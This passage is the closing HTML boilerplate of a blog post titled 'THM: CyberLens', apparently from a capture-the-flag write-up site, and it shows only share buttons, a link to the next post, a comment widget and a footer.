+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f06%2fthm-cyberlens%2f&amp;resubmit=true&amp;title=THM%3a%20CyberLens" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f06%2fthm-cyberlens%2f;title=THM%3a%20CyberLens" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=THM%3a%20CyberLens%20https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f06%2fthm-cyberlens%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f06%2fthm-cyberlens%2f&amp;t=THM%3a%20CyberLens" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=THM%3a%20CyberLens&amp;url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f06%2fthm-cyberlens%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="https://scorpiosec.com/posts/2024/06/htb-crafty/">
+                    <span class="button__text">HTB: Crafty</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+    
+    <script src="https://utteranc.es/client.js"
+            repo="K-Scorpio/scorpiosec"
+            label="comment"
+            issue-term="pathname"
+            theme="github-dark"
+            crossorigin="anonymous"
+            async>
+    </script>
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2023</span>
+            
+            
+            
+            <span>K-Scorpio</span>
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Theme - <a href="https://themes.gohugo.io/themes/hugo-theme-hello-friend-ng/">Hello Friend NG</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://scorpiosec.com/bundle.min.ac2a4bcaed631ec2dc154407be7f09fc28da37de71fae6dee6711b2a3d1622770f87d3cda22c460e9a68ff619bdb1dd75cb7a5d33f159a54e419736cc4541087.js" integrity="sha512-rCpLyu1jHsLcFUQHvn8J/CjaN95x&#43;ube5nEbKj0WIncPh9PNoixGDppo/2Gb2x3XXLel0z8VmlTkGXNsxFQQhw=="></script>
+
+
+
+
+    </body>
+</html>
